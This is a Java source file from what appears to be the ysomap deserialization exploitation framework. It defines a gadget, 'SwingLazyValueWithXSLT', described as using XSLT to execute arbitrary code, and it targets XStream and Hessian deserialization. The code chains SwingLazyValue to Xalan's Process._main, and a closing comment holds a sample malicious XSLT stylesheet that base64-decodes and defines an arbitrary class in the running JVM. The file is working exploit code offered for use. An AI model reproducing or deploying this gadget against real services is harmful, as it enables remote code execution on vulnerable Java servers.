package ysomap.bullets.jdk;

import sun.swing.SwingLazyValue;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("利用xslt执行任意代码")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithXSLT extends AbstractBullet<SwingLazyValue> {

    @NotNull
    @Require(name = "filepath", detail = ".xslt filepath")
    public String filepath;

    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "com.sun.org.apache.xalan.internal.xslt.Process";
        String methodName = "_main";
        Object[] evilargs = new Object[]{new String[]{"-XT", "-XSL", "file://" + filepath}};
        // xslt file example https://yzddmr6.com/posts/swinglazyvalue-in-webshell/#%e5%88%a9%e7%94%a8%e4%ba%94%e8%90%bd%e7%9b%98xslt%e5%b9%b6%e5%8a%a0%e8%bd%bd
        return new SwingLazyValue(classname, methodName, evilargs);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new SwingLazyValueWithXSLT();
        bullet.set("command", args[0]);
        return bullet;
    }

/*
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
              xmlns:b64="http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder"
              xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
              xmlns:th="http://xml.apache.org/xalan/java/java.lang.Thread"
              xmlns:ru="http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils"
>
  <xsl:template match="/">
      <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'base64')"/>
      <xsl:variable name="cl" select="th:getContextClassLoader(th:currentThread())"/>
      <xsl:variable name="rce" select="ru:defineClass('classname',$bs,$cl)"/>
      <xsl:value-of select="$rce"/>
  </xsl:template>
</xsl:stylesheet>
*/
}
